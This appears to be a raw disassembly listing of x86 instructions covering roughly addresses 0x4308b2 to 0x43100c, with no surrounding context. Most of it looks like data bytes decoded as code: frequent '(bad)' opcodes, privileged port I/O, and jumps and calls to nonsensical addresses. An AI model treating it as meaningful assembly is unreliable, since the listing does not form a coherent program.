  4308b2:	mov    al,0x81
  4308b4:	push   es
  4308b5:	(bad)  
  4308b6:	pusha  
  4308b7:	xor    ch,BYTE PTR [eax+0x65]
  4308ba:	movups xmm3,XMMWORD PTR [ecx]
  4308bd:	mov    esp,DWORD PTR ds:0x7508a6ed
  4308c3:	scas   eax,DWORD PTR es:[edi]
  4308c4:	ins    DWORD PTR es:[edi],dx
  4308c5:	jo     0x43088c
  4308c7:	lods   al,BYTE PTR ds:[esi]
  4308c8:	pop    ebp
  4308c9:	push   esp
  4308ca:	stc    
  4308cb:	mov    ebp,0xe8c4b4cc
  4308d0:	out    0x48,al
  4308d2:	mov    cl,0x56
  4308d4:	in     al,0x2
  4308d6:	add    BYTE PTR [eax],al
  4308d8:	add    BYTE PTR [eax],al
  4308da:	add    BYTE PTR [ebp+0x2],dh
  4308dd:	add    BYTE PTR [esi+0x290e9442],dh
  4308e3:	jns    0x430963
  4308e5:	mov    edi,0x447b631d
  4308ea:	popf   
  4308eb:	cli    
  4308ec:	xchg   ebx,eax
  4308ed:	jae    0x4308b1
  4308ef:	or     DWORD PTR [ecx+0x61],0x86c08560
  4308f6:	scas   eax,DWORD PTR es:[edi]
  4308f7:	bndstx [edx],bnd1
  4308fa:	cmc    
  4308fb:	pop    esp
  4308fc:	pop    es
  4308fd:	mov    bl,0xe1
  4308ff:	icebp  
  430900:	pop    edx
  430901:	sub    dh,ch
  430903:	jnp    0x4308d8
  430905:	clc    
  430906:	lds    esp,FWORD PTR [ebx]
  430908:	add    ah,BYTE PTR [esi-0x23]
  43090b:	das    
  43090c:	loop   0x430896
  43090e:	loope  0x430901
  430910:	xchg   ebx,eax
  430911:	std    
  430912:	(bad)  
  430913:	stc    
  430914:	or     eax,DWORD PTR [eax]
  430916:	mov    esp,0xd3075c52
  43091b:	scas   al,BYTE PTR es:[edi]
  43091c:	stos   DWORD PTR es:[edi],eax
  43091d:	out    0x2a,eax
  43091f:	push   ss
  430920:	pop    ecx
  430921:	cli    
  430922:	(bad)  
  430923:	das    
  430924:	xchg   esp,eax
  430925:	push   esp
  430926:	jb     0x43096d
  430928:	aam    0xe3
  43092a:	and    esi,esi
  43092c:	addr16 jae 0x430919
  43092f:	jbe    0x430933
  430931:	dec    edi
  430932:	mov    bh,0xdd
  430934:	and    al,0xd7
  430936:	xchg   ecx,eax
  430937:	push   0xffffff87
  430939:	aas    
  43093a:	jmp    0xcd9e8508
  43093f:	add    BYTE PTR [eax],al
  430941:	add    BYTE PTR [eax],al
  430943:	add    BYTE PTR [ebp-0x76aaeba8],cl
  430949:	adc    eax,DWORD PTR [eax]
  43094b:	jo     0x4308ff
  43094d:	pop    ds
  43094e:	adc    BYTE PTR [edx],ah
  430950:	mov    eax,0x762a8408
  430955:	add    al,BYTE PTR [eax]
  430957:	bound  ecx,QWORD PTR [ebx-0x73fff07a]
  43095d:	dec    BYTE PTR [edx+0x50]
  430960:	dec    edi
  430961:	loop   0x430958
  430963:	(bad)  
  430964:	inc    edi
  430965:	mov    esi,0xe15c106e
  43096a:	outs   dx,BYTE PTR ds:[esi]
  43096b:	and    al,0x38
  43096d:	dec    edx
  43096e:	cmc    
  43096f:	(bad)  
  430970:	pop    ss
  430971:	mov    esi,0xb647f473
  430976:	jae    0x430982
  430978:	fidivr DWORD PTR [edx]
  43097a:	push   ds
  43097b:	prefetch (bad)
  43097c:	or     eax,0x1c0108e8
  430981:	jmp    DWORD PTR [ecx+0x75]
  430984:	xchg   ecx,eax
  430985:	sub    ebx,DWORD PTR [esi]
  430987:	and    BYTE PTR [edi+eax*4+0x56],ah
  43098b:	and    al,0x74
  43098d:	xchg   DWORD PTR [esi+0x24],edx
  430990:	call   0x43e45d7b
  430995:	loop   0x4309fb
  430997:	add    al,0x1f
  430999:	xchg   al,al
  43099b:	mov    ebx,ecx
  43099d:	call   0x448b:0x8edc400a
  4309a4:	js     0x4309c4
  4309a6:	push   eax
  4309a7:	inc    DWORD PTR [eax]
  4309a9:	add    BYTE PTR [eax],al
  4309ab:	add    BYTE PTR [eax],al
  4309ad:	or     BYTE PTR [ebx],bl
  4309af:	and    bh,bh
  4309b1:	jp     0x430a2f
  4309b3:	mov    edx,0xfb16180f
  4309b8:	call   FWORD PTR [ebp+eax*4-0xa57dbc2]
  4309bf:	mov    edx,0xbfed8875
  4309c4:	jmp    0x43095f
  4309c6:	out    0xdf,al
  4309c8:	rol    BYTE PTR [ecx-0x47bb784e],0x56
  4309cf:	xor    ebx,eax
  4309d1:	cmp    DWORD PTR [edx-0x48],0x0
  4309d5:	pop    esp
  4309d6:	push   es
  4309d7:	bound  eax,QWORD PTR [esi*2-0x66bc6ef4]
  4309de:	pop    es
  4309df:	mov    ah,0x8c
  4309e1:	mov    cl,0xff
  4309e3:	and    edx,DWORD PTR [eax+0x52]
  4309e6:	sbb    BYTE PTR [eax],ch
  4309e8:	and    BYTE PTR [edx+0x72],cl
  4309eb:	mov    BYTE PTR [edi-0x8a188e],bh
  4309f1:	cmp    bl,BYTE PTR [esi+eiz*8+0xb]
  4309f5:	add    bl,BYTE PTR [esp+eax*1]
  4309f8:	jg     0x430a37
  4309fa:	jns    0x43098c
  4309fc:	jae    0x430a57
  4309fe:	jmp    FWORD PTR [ebx+0x35]
  430a01:	sub    DWORD PTR [edi-0x13c479a6],eax
  430a07:	pop    edx
  430a08:	adc    al,0x59
  430a0a:	cs mov esi,0x2827f1ff
  430a10:	sub    BYTE PTR [eax],al
  430a12:	add    BYTE PTR [eax],al
  430a14:	add    BYTE PTR [eax],al
  430a16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  430a17:	call   0x9bc7b214
  430a1c:	(bad)  
  430a1d:	gs arpl si,sp
  430a20:	xlat   BYTE PTR ds:[ebx]
  430a21:	and    esp,DWORD PTR [ecx+0x15cc6693]
  430a27:	leave  
  430a28:	pop    edx
  430a29:	mov    ecx,?
  430a2b:	pop    es
  430a2c:	fadd   QWORD PTR [eax]
  430a2e:	jne    0x430a8b
  430a30:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430a32:	ret    
  430a33:	and    BYTE PTR [ebx+0xa],bl
  430a36:	add    ah,BYTE PTR [eax+0x60452822]
  430a3c:	xchg   ecx,eax
  430a3d:	inc    ebx
  430a3e:	push   ecx
  430a3f:	dec    ecx
  430a40:	scas   al,BYTE PTR es:[edi]
  430a41:	or     ch,dl
  430a43:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  430a44:	and    dh,BYTE PTR [edx]
  430a46:	inc    ebp
  430a47:	(bad)  
  430a48:	xchg   DWORD PTR [ebx],esp
  430a4a:	stc    
  430a4b:	pop    ebx
  430a4c:	(bad)  
  430a4d:	jmp    DWORD PTR ds:0xed2387e6
  430a53:	pop    edx
  430a54:	(bad)  
  430a55:	jmp    DWORD PTR ds:0xc2456e02
  430a5b:	fcomp  QWORD PTR [edx]
  430a5d:	mov    ebx,0xf40c8df9
  430a62:	jne    0x430a66
  430a64:	jmp    0xc37832d4
  430a69:	pop    esi
  430a6a:	rol    DWORD PTR [esi-0x20],cl
  430a6d:	mov    BYTE PTR [edx],cl
  430a6f:	ror    BYTE PTR [eax],1
  430a71:	pop    edi
  430a72:	(bad)  
  430a73:	es aad 0x8a
  430a76:	aaa    
  430a77:	push   ecx
  430a78:	sbb    al,0x28
  430a7a:	add    BYTE PTR [eax],al
  430a7c:	add    BYTE PTR [eax],al
  430a7e:	add    BYTE PTR [ecx-0x1efef4e],dl
  430a84:	shr    eax,0xe9
  430a87:	and    BYTE PTR [ecx+0x36],ch
  430a8a:	mov    BYTE PTR [edi],bl
  430a8c:	push   ecx
  430a8d:	ins    BYTE PTR es:[edi],dx
  430a8e:	inc    ebx
  430a8f:	xchg   BYTE PTR [edi],al
  430a91:	mov    ds:0xe80156c7,eax
  430a96:	adc    ch,BYTE PTR [edx]
  430a98:	push   ecx
  430a99:	hlt    
  430a9a:	daa    
  430a9b:	pop    ebp
  430a9c:	pop    edx
  430a9d:	scas   al,BYTE PTR es:[edi]
  430a9e:	inc    ebx
  430a9f:	icebp  
  430aa0:	push   eax
  430aa1:	mov    ch,0x5e
  430aa3:	data16 es std 
  430aa6:	pop    esi
  430aa7:	mov    DWORD PTR [edx-0x8],esi
  430aaa:	ret    
  430aab:	fidivr DWORD PTR [edx-0x54]
  430aae:	daa    
  430aaf:	jle    0x430a62
  430ab1:	call   0x2942:0x9366f3ba
  430ab8:	jge    0x430af6
  430aba:	adc    dh,0x49
  430abd:	outs   dx,DWORD PTR ds:[si]
  430abf:	scas   al,BYTE PTR es:[edi]
  430ac0:	add    ebp,ecx
  430ac2:	add    edi,DWORD PTR [edx]
  430ac4:	mov    eax,0xb97ad85d
  430ac9:	or     eax,ebx
  430acb:	push   0x51
  430acd:	jnp    0x430ade
  430acf:	daa    
  430ad0:	push   ecx
  430ad1:	shl    DWORD PTR [ebx-0x17003d86],cl
  430ad7:	icebp  
  430ad8:	les    esp,FWORD PTR [ebx]
  430ada:	fldln2 
  430adc:	nop
  430add:	or     ch,BYTE PTR [ebp+0x66]
  430ae0:	add    eax,DWORD PTR [eax]
  430ae2:	jmp    0x430ae7
  430ae7:	add    cl,al
  430ae9:	(bad)  
  430aea:	psubsw mm6,QWORD PTR [esi+0x2]
  430aee:	adc    dh,bl
  430af0:	repz add eax,DWORD PTR [ecx]
  430af3:	jmp    0xef34906e
  430af8:	repnz dec ebx
  430afa:	(bad)  
  430afb:	call   0xe97cda76
  430b00:	imul   eax,DWORD PTR [esi+ebp*8+0x7f0276e9],0xb027d1f
  430b0b:	ins    DWORD PTR es:[edi],dx
  430b0c:	mov    cs,WORD PTR [edi-0x6]
  430b0f:	jmp    0x87dab2a2
  430b14:	mov    al,0x83
  430b16:	mov    edi,0xff2bf2ee
  430b1b:	call   0xc5868896
  430b20:	push   esi
  430b21:	mov    dl,0xfa
  430b23:	cld    
  430b24:	push   ds
  430b25:	repz aas 
  430b27:	jmp    0x9dcfdd08
  430b2c:	lea    eax,[esi-0x1]
  430b2f:	call   0x332ab5aa
  430b34:	push   eax
  430b35:	dec    esp
  430b36:	cli    
  430b37:	shl    DWORD PTR [ecx+0x5d0d737e],cl
  430b3d:	stos   BYTE PTR es:[edi],al
  430b3e:	out    0x6e,eax
  430b40:	cmp    BYTE PTR [edx+edi*8+0x74],cl
  430b44:	std    
  430b45:	and    eax,DWORD PTR [eax]
  430b47:	call   0x7f2b0dc2
  430b4c:	add    BYTE PTR [eax],al
  430b4e:	add    BYTE PTR [eax],al
  430b50:	add    BYTE PTR [edx+0x4c],al
  430b53:	cli    
  430b54:	fiadd  WORD PTR [ecx]
  430b56:	les    esp,FWORD PTR [ebx]
  430b58:	add    BYTE PTR [ebx+edx*4+0x27d0b705],bh
  430b5f:	push   ds
  430b60:	push   eax
  430b61:	fwait
  430b62:	jbe    0x430ba2
  430b64:	and    al,0xba
  430b66:	xchg   ebx,eax
  430b67:	add    esi,0x247e7fac
  430b6d:	ins    BYTE PTR es:[edi],dx
  430b6e:	add    al,0x0
  430b70:	add    BYTE PTR [edi+edi*2+0x320247e],bl
  430b77:	add    BYTE PTR [eax],al
  430b79:	ins    BYTE PTR es:[edi],dx
  430b7a:	pop    esp
  430b7b:	cmp    BYTE PTR [ebx-0x27],bl
  430b7e:	das    
  430b7f:	push   ds
  430b80:	pop    eax
  430b81:	xor    al,0xc6
  430b83:	int3   
  430b84:	std    
  430b85:	or     eax,DWORD PTR [edx-0x3c5ee742]
  430b8b:	js     0x430bff
  430b8d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  430b8e:	dec    eax
  430b8f:	add    bh,bh
  430b91:	cmp    al,0xae
  430b93:	push   0x4
  430b95:	xchg   edi,eax
  430b96:	(bad)  
  430b97:	dec    edx
  430b98:	xor    edi,ebx
  430b9a:	xchg   ebp,eax
  430b9b:	fs add ah,ah
  430b9e:	cmp    edi,DWORD PTR [ecx-0x1]
  430ba1:	mov    eax,DWORD PTR [edi+0x796574ba]
  430ba7:	jae    0x430bb5
  430ba9:	xchg   edi,eax
  430baa:	mov    ch,0x6e
  430bac:	push   edx
  430bad:	mov    dl,0xeb
  430baf:	xor    eax,0x3e801974
  430bb4:	and    al,0x0
  430bb6:	add    BYTE PTR [eax],al
  430bb8:	add    BYTE PTR [eax],al
  430bba:	or     al,0x93
  430bbc:	cmc    
  430bbd:	adc    eax,0x3a512c
  430bc2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  430bc3:	cli    
  430bc4:	addr16 adc al,0x5b
  430bc7:	inc    ebx
  430bc8:	cli    
  430bc9:	mov    WORD PTR [eax],ss
  430bcb:	inc    edi
  430bcc:	inc    edx
  430bcd:	push   eax
  430bce:	test   BYTE PTR [eax-0x4b],ch
  430bd1:	std    
  430bd2:	mov    esi,edx
  430bd4:	enter  0x7566,0xe2
  430bd8:	mov    BYTE PTR [edi],0x43
  430bdb:	scas   al,BYTE PTR es:[edi]
  430bdc:	shl    BYTE PTR [ebx],cl
  430bde:	ins    DWORD PTR es:[edi],dx
  430bdf:	fadd   QWORD PTR [esi-0x6]
  430be2:	popf   
  430be3:	or     dh,BYTE PTR [eax]
  430be5:	cld    
  430be6:	sbb    ah,0x3e
  430be9:	jae    0x430c4a
  430beb:	pusha  
  430bec:	shl    DWORD PTR [ebx],1
  430bee:	xchg   ecx,eax
  430bef:	(bad)  
  430bf0:	mov    edi,0xcf2cb123
  430bf5:	and    edi,DWORD PTR [ebp+0xb]
  430bf8:	scas   eax,DWORD PTR es:[edi]
  430bf9:	gs ja  0x430c3f
  430bfc:	push   esp
  430bfd:	jge    0x430c51
  430bff:	inc    ebp
  430c00:	imul   eax,DWORD PTR [ebx-0x79a970da],0xffffffb9
  430c07:	push   ebx
  430c09:	pop    edx
  430c0a:	fwait
  430c0b:	lock mov ah,ah
  430c0e:	rcr    BYTE PTR [ecx+0x15c00007],1
  430c14:	scas   eax,DWORD PTR es:[edi]
  430c15:	cli    
  430c16:	test   eax,0x80faee3f
  430c1b:	retf   
  430c1c:	icebp  
  430c1d:	aas    
  430c1e:	add    BYTE PTR [eax],al
  430c20:	add    BYTE PTR [eax],al
  430c22:	add    BYTE PTR [ebp-0x30],dh
  430c25:	pop    ebx
  430c26:	mov    esp,0xfffe591d
  430c2b:	ds (bad) 
  430c2d:	aad    0x2d
  430c2f:	mov    ebx,0x753e5fcf
  430c34:	lea    edx,[ebp+0x14]
  430c37:	or     DWORD PTR [eax-0x42],0x63eee3ff
  430c3e:	jecxz  0x430c76
  430c40:	pop    ebx
  430c41:	mov    bx,0xc713
  430c45:	push   esi
  430c46:	jle    0x430bd8
  430c48:	mov    ebx,0x5b753e5f
  430c4d:	adc    eax,eax
  430c4f:	and    eax,DWORD PTR [ebp-0x5f]
  430c52:	out    0x99,eax
  430c54:	add    ah,BYTE PTR [esi+0xf7ae03]
  430c5a:	mul    DWORD PTR [edx+0x2]
  430c5d:	add    BYTE PTR [edx-0x4917b266],ah
  430c63:	sbb    bl,BYTE PTR [esi+0xc]
  430c66:	(bad)  
  430c67:	mov    cl,BYTE PTR [ebx+edx*8-0x11]
  430c6b:	jae    0x430c2f
  430c6d:	call   0x132d27c
  430c72:	pusha  
  430c73:	mov    bl,0x2
  430c75:	out    0x3a,al
  430c77:	sub    al,0x62
  430c79:	(bad)  
  430c7a:	(bad)  
  430c7b:	bound  ecx,QWORD PTR [eax]
  430c7d:	mov    ah,0xd1
  430c7f:	mov    bl,0x8b
  430c81:	mov    eax,0xd1027502
  430c86:	xchg   edx,eax
  430c87:	add    BYTE PTR [eax],al
  430c89:	add    BYTE PTR [eax],al
  430c8b:	add    BYTE PTR [ecx],cl
  430c8d:	dec    edi
  430c8e:	mov    ecx,0x42d6027f
  430c93:	or     eax,DWORD PTR [esi]
  430c95:	inc    eax
  430c97:	pop    edi
  430c98:	jae    0x430c9c
  430c9a:	outs   dx,BYTE PTR ds:[esi]
  430c9b:	inc    eax
  430c9c:	push   ebx
  430c9d:	inc    ebp
  430c9e:	int    0x4b
  430ca0:	icebp  
  430ca1:	cmc    
  430ca2:	call   0x25a9474b
  430ca7:	add    al,0xc3
  430ca9:	jg     0x430c9f
  430cab:	retf   
  430cac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  430cad:	mov    dl,0x90
  430caf:	je     0x430c6d
  430cb1:	dec    esi
  430cb2:	jno    0x430cba
  430cb4:	pusha  
  430cb5:	bound  eax,QWORD PTR [esi+eax*8+0x1aec7df2]
  430cbc:	inc    ebp
  430cbd:	dec    ebp
  430cbe:	aam    0x1f
  430cc0:	jge    0x430c72
  430cc2:	inc    eax
  430cc3:	fcomp  DWORD PTR [edi+ecx*2]
  430cc6:	dec    ecx
  430cc7:	loope  0x430cc6
  430cc9:	push   ds
  430cca:	push   ecx
  430ccb:	pop    edi
  430ccc:	mov    eax,DWORD PTR [edx]
  430cce:	dec    esi
  430ccf:	adc    al,0xf0
  430cd1:	std    
  430cd2:	call   ecx
  430cd4:	dec    esi
  430cd5:	fstp   TBYTE PTR [esp+ebp*1-0x62407eb1]
  430cdc:	push   ebp
  430cdd:	test   DWORD PTR [ecx+ecx*1],ecx
  430ce0:	inc    edx
  430ce1:	or     al,0x0
  430ce3:	fs call 0xe805:0xe7de5007
  430ceb:	or     eax,0x75f94cb3
  430cf0:	add    BYTE PTR [eax],al
  430cf2:	add    BYTE PTR [eax],al
  430cf4:	add    BYTE PTR [edx-0x16],ah
  430cf7:	mov    ebp,gs
  430cf9:	mov    cl,0xbc
  430cfb:	out    0xa3,eax
  430cfd:	or     al,0x4f
  430cff:	cli    
  430d00:	dec    edi
  430d01:	(bad)  
  430d02:	out    dx,al
  430d03:	out    0xc5,eax
  430d05:	cmp    BYTE PTR [edx+eiz*2-0x3b],cl
  430d09:	aad    0xc
  430d0b:	add    dh,cl
  430d0d:	(bad)  
  430d0e:	hlt    
  430d0f:	push   cs
  430d10:	sub    DWORD PTR [ecx-0x4d],esi
  430d13:	pop    edx
  430d14:	pop    ds
  430d15:	or     cl,BYTE PTR [esi-0x75fb16fd]
  430d1b:	jmp    0x430ce2
  430d1d:	cmp    BYTE PTR [esp+edx*2-0x5a],cl
  430d21:	sbb    dh,al
  430d23:	push   cs
  430d24:	sub    DWORD PTR [ecx-0x1c],edi
  430d27:	adc    esi,DWORD PTR [ecx]
  430d29:	mov    esp,0x3885dc16
  430d2e:	dec    esp
  430d2f:	fs dec edx
  430d31:	xchg   ebp,eax
  430d32:	pop    edi
  430d33:	ds jmp 0x74ff3cc7
  430d39:	pushf  
  430d3a:	sbb    al,0xc0
  430d3c:	mov    al,0x32
  430d3e:	and    BYTE PTR [eax],cl
  430d40:	fnsave [ebx+0x47]
  430d43:	jae    0x430d4a
  430d45:	jno    0x430cf9
  430d47:	jle    0x430d6a
  430d49:	cmp    al,0x63
  430d4b:	mov    ch,0x26
  430d4d:	sub    cl,BYTE PTR [eax+0x51]
  430d50:	add    bh,bh
  430d52:	or     bl,bh
  430d54:	inc    ebx
  430d55:	int3   
  430d56:	stos   BYTE PTR es:[edi],al
  430d57:	adc    ebx,DWORD PTR [eax]
  430d59:	add    BYTE PTR [eax],al
  430d5b:	add    BYTE PTR [eax],al
  430d5d:	add    BYTE PTR [edi+0x5e5dfa3f],bl
  430d63:	add    al,BYTE PTR [eax]
  430d65:	push   ebp
  430d66:	daa    
  430d67:	fidivr DWORD PTR [ecx-0x1c]
  430d6a:	push   esp
  430d6b:	jg     0x430d53
  430d6d:	je     0x430cfe
  430d6f:	(bad)  
  430d70:	call   DWORD PTR [edx-0x36]
  430d73:	xchg   edx,eax
  430d74:	cmp    DWORD PTR [ebp-0x7c],0x180ff5cc
  430d7b:	jmp    0xd7cf0d80
  430d80:	push   esi
  430d81:	xchg   esi,eax
  430d82:	bound  ebp,QWORD PTR [edx-0x349c3f82]
  430d88:	sub    al,0x1
  430d8a:	dec    esp
  430d8b:	inc    DWORD PTR [edx+0xf44847]
  430d91:	add    bl,BYTE PTR [edi+edi*8+0x6]
  430d95:	test   edi,ecx
  430d97:	(bad)  
  430d98:	(bad)  
  430d99:	jmp    DWORD PTR [edx+ebx*8-0x55b3bc22]
  430da0:	adc    edx,DWORD PTR [edi+ecx*2]
  430da3:	aas    
  430da4:	cli    
  430da5:	gs lahf 
  430da7:	hlt    
  430da8:	jecxz  0x430d8e
  430daa:	dec    edi
  430dab:	push   es
  430dac:	add    BYTE PTR [edi],cl
  430dae:	mov    al,BYTE PTR [edx+edi*8-0xa98e301]
  430db5:	call   FWORD PTR [edi+edi*8]
  430db8:	pop    ebp
  430db9:	add    DWORD PTR [ecx],ebx
  430dbb:	stos   DWORD PTR es:[edi],eax
  430dbc:	fiadd  WORD PTR [ebx+0xc]
  430dbf:	test   BYTE PTR [esi+0x24],ch
  430dc2:	add    BYTE PTR [eax],al
  430dc4:	add    BYTE PTR [eax],al
  430dc6:	add    BYTE PTR [eax-0x23ff6b9a],bh
  430dcc:	(bad)  
  430dcd:	out    0x58,eax
  430dcf:	popa   
  430dd0:	stos   BYTE PTR es:[edi],al
  430dd1:	cmc    
  430dd2:	mov    esi,DWORD PTR [ebp+0x1b]
  430dd5:	scas   eax,DWORD PTR es:[edi]
  430dd6:	out    0x4e,eax
  430dd8:	arpl   WORD PTR [eax-0x6],bx
  430ddb:	cld    
  430ddc:	pushf  
  430ddd:	sbb    cl,BYTE PTR [eax+edi*8]
  430de0:	sbb    bl,cl
  430de2:	pop    esi
  430de3:	call   0xed7f2874
  430de8:	mov    al,0xfe
  430dea:	push   DWORD PTR [ebp-0xf]
  430ded:	sbb    al,0x9d
  430def:	mov    ds:0x517381eb,al
  430df4:	dec    ecx
  430df5:	xchg   esi,eax
  430df6:	cwde   
  430df7:	jne    0x430e52
  430df9:	(bad)  
  430dfa:	out    0x59,eax
  430dfc:	out    0x57,al
  430dfe:	cli    
  430dff:	aam    0xec
  430e01:	pop    edx
  430e02:	ds jne 0x430de3
  430e05:	ds jae 0x430e7f
  430e08:	in     al,0x4e
  430e0a:	cli    
  430e0b:	adc    BYTE PTR [ebx-0x13],0x3f
  430e0f:	jne    0x430e1c
  430e11:	push   ebx
  430e12:	xor    al,0x29
  430e14:	mov    edi,DWORD PTR [esi+0x202001ff]
  430e1a:	inc    esp
  430e1b:	mov    ds:0x740396eb,eax
  430e20:	pop    ebx
  430e21:	dec    BYTE PTR [ecx+edi*8+0x75008bf7]
  430e28:	pop    ebx
  430e29:	cmp    ax,0x0
  430e2d:	add    BYTE PTR [eax],al
  430e2f:	add    BYTE PTR [ebp-0x61],al
  430e32:	push   edx
  430e33:	xchg   BYTE PTR [ecx+0x317ef23f],ch
  430e39:	dec    esp
  430e3a:	test   edx,eax
  430e3c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  430e3d:	xor    DWORD PTR [esi-0x797ef583],0x1
  430e44:	stos   DWORD PTR es:[edi],eax
  430e45:	enter  0x7b3,0xee
  430e49:	dec    esi
  430e4a:	push   es
  430e4b:	push   0xffbe7fe1
  430e50:	jmp    0x430e54
  430e52:	cld    
  430e53:	sti    
  430e54:	jae    0x430e18
  430e56:	call   0xe94a73c5
  430e5b:	add    al,0x75
  430e5d:	add    dl,ah
  430e5f:	jmp    0xfb33d7af
  430e64:	inc    esi
  430e65:	fisubr WORD PTR [ebx-0x40]
  430e68:	xchg   esi,eax
  430e69:	retf   0x5698
  430e6c:	mov    DWORD PTR [esi+0x7eaac3d4],esp
  430e72:	sub    al,dl
  430e74:	dec    ecx
  430e75:	fsub   st(0),st
  430e77:	jmp    0x1fef85e9
  430e7c:	ins    DWORD PTR es:[edi],dx
  430e7d:	mov    dl,0x5b
  430e7f:	adc    BYTE PTR [esi+0x7e],0xe8
  430e83:	add    esi,DWORD PTR [ebp-0x4e]
  430e86:	jmp    0xcc3b4621
  430e8b:	push   esi
  430e8c:	jb     0x430ed7
  430e8e:	call   0xf1147e46
  430e93:	push   esi
  430e94:	add    BYTE PTR [eax],al
  430e96:	add    BYTE PTR [eax],al
  430e98:	add    BYTE PTR [ecx+0x5ac3f4e2],cl
  430e9e:	jle    0x430e48
  430ea0:	aad    0xa1
  430ea2:	test   eax,edx
  430ea4:	add    al,0xc0
  430ea6:	mul    DWORD PTR [ebp-0x2a]
  430ea9:	jp     0x430ea5
  430eab:	xor    ecx,DWORD PTR ds:0xc36222cd
  430eb1:	xor    bl,BYTE PTR [edx+edx*8-0x2a]
  430eb5:	jb     0x430e97
  430eb7:	xlat   BYTE PTR gs:[ebx]
  430eb9:	push   esi
  430eba:	repnz enter 0x85d1,0x15
  430ebf:	mov    al,ds:0x24b5fddd
  430ec4:	hlt    
  430ec5:	stc    
  430ec6:	mov    ebp,0x5ab2f3cc
  430ecb:	or     eax,0xff48ff59
  430ed0:	sbb    eax,0xd59fee4a
  430ed5:	mov    dh,0x48
  430ed7:	pop    ecx
  430ed8:	(bad)  
  430ed9:	pop    ds
  430eda:	and    ah,0xbc
  430edd:	xor    al,0x5
  430edf:	add    BYTE PTR [edi+edi*8-0x5a9daea4],bh
  430ee6:	add    BYTE PTR [ebx-0x61],dl
  430ee9:	sub    ebp,esi
  430eeb:	aaa    
  430eec:	aad    0xb6
  430eee:	dec    eax
  430eef:	test   DWORD PTR [ecx],esi
  430ef1:	add    esi,eax
  430ef3:	pop    es
  430ef4:	inc    ecx
  430ef5:	dec    ecx
  430ef6:	jne    0x430ef1
  430ef8:	and    cl,BYTE PTR es:[ecx+0xe674]
  430eff:	add    BYTE PTR [eax],al
  430f01:	add    bh,ch
  430f03:	inc    ebx
  430f04:	call   0x45856d
  430f09:	fs and edi,esp
  430f0c:	sub    DWORD PTR [ebx+0x76],0x2
  430f10:	add    BYTE PTR [edx+0x20],ch
  430f13:	add    dh,BYTE PTR [ebx+eiz*8-0x9]
  430f17:	dec    ecx
  430f18:	or     al,0x75
  430f1a:	jne    0x430ee3
  430f1c:	stc    
  430f1d:	out    dx,al
  430f1e:	xor    ebx,ecx
  430f20:	dec    esi
  430f21:	ss shr dh,0xdf
  430f25:	clc    
  430f26:	ss dec eax
  430f28:	test   DWORD PTR [ecx+0x4d7330ca],esi
  430f2e:	in     al,dx
  430f2f:	inc    ecx
  430f30:	inc    edi
  430f31:	xor    eax,0xefe7c942
  430f36:	inc    edx
  430f37:	sti    
  430f38:	jle    0x430efb
  430f3a:	sub    ecx,edi
  430f3c:	pop    ss
  430f3d:	jb     0x430efb
  430f3f:	pusha  
  430f40:	adc    bh,BYTE PTR [edx]
  430f42:	lsl    edi,WORD PTR [edi-0x5f]
  430f46:	test   al,0x5f
  430f48:	aad    0xa4
  430f4a:	mov    ds:0xf400864c,al
  430f4f:	fld    DWORD PTR [edx]
  430f51:	push   ebx
  430f52:	data16 (bad) 
  430f54:	loop   0x430f45
  430f56:	push   edi
  430f57:	das    
  430f58:	add    al,BYTE PTR [ebp-0x41d4cda5]
  430f5e:	dec    eax
  430f5f:	loop   0x430f9a
  430f61:	add    BYTE PTR [edx],ah
  430f63:	scas   eax,DWORD PTR es:[edi]
  430f64:	adc    edx,DWORD PTR [eax+eax*1]
  430f67:	add    BYTE PTR [eax],al
  430f69:	add    BYTE PTR [eax],al
  430f6b:	iret   
  430f6c:	inc    ebx
  430f6d:	cli    
  430f6e:	addr16 jo 0x430fee
  430f71:	cmp    al,BYTE PTR [eax]
  430f73:	and    al,0xc0
  430f75:	idiv   bh
  430f77:	jnp    0x430f0e
  430f79:	loop   0x430f43
  430f7b:	push   0x5b56f5ad
  430f80:	push   edi
  430f81:	adc    dl,BYTE PTR [ebx]
  430f83:	int3   
  430f84:	add    esi,DWORD PTR [ebx]
  430f86:	sti    
  430f87:	add    BYTE PTR [esi+0x4d],al
  430f8a:	call   0x3e78cd
  430f8f:	jnp    0x430fc8
  430f91:	add    bh,bh
  430f93:	mov    eax,ds:0x8c400fa7
  430f98:	mov    al,BYTE PTR [ecx+0x588e5445]
  430f9e:	pop    ebp
  430f9f:	sahf   
  430fa0:	add    al,BYTE PTR [eax]
  430fa2:	push   ebp
  430fa3:	out    0xdf,eax
  430fa5:	jg     0x430f93
  430fa7:	in     al,dx
  430fa8:	add    BYTE PTR [eax],al
  430faa:	add    BYTE PTR [edi-0x1cf02887],cl
  430fb0:	inc    ecx
  430fb1:	(bad)  
  430fb2:	push   ebp
  430fb3:	arpl   WORD PTR [eax],bp
  430fb5:	add    eax,0xffffff81
  430fb8:	inc    ebp
  430fb9:	mov    dl,0x95
  430fbb:	sbb    al,0x3
  430fbd:	add    bl,ch
  430fbf:	and    al,BYTE PTR [edx+0x36db0871]
  430fc5:	sub    cl,BYTE PTR [ebp-0x49c47]
  430fcb:	jne    0x43103d
  430fcd:	data16 add BYTE PTR ss:[eax],al
  430fd1:	add    BYTE PTR [eax],al
  430fd3:	add    dh,ch
  430fd5:	ja     0x43102a
  430fd7:	cli    
  430fd8:	xchg   BYTE PTR [ecx-0x79],dl
  430fdb:	ret    0xd6a5
  430fde:	jns    0x430f87
  430fe0:	repz iret 
  430fe2:	push   ebx
  430fe3:	gs jne 0x430fcf
  430fe6:	xchg   esi,eax
  430fe7:	push   eax
  430fe8:	je     0x431043
  430fea:	(bad)  
  430feb:	out    0x45,eax
  430fed:	jle    0x431043
  430fef:	cli    
  430ff0:	not    BYTE PTR [edi+ebp*8]
  430ff3:	test   BYTE PTR [ebp-0xd4811d4],dh
  430ff9:	pop    eax
  430ffa:	(bad)  
  430ffb:	(bad)  
  430ffc:	call   0xb33cb6c6
  431001:	packuswb mm0,QWORD PTR [esi]
  431004:	push   cs
  431005:	sbb    BYTE PTR [edi+eiz*8+0x26],dl
  431009:	aad    0x53
  43100b:	cli    
  43100c:	inc    ebp
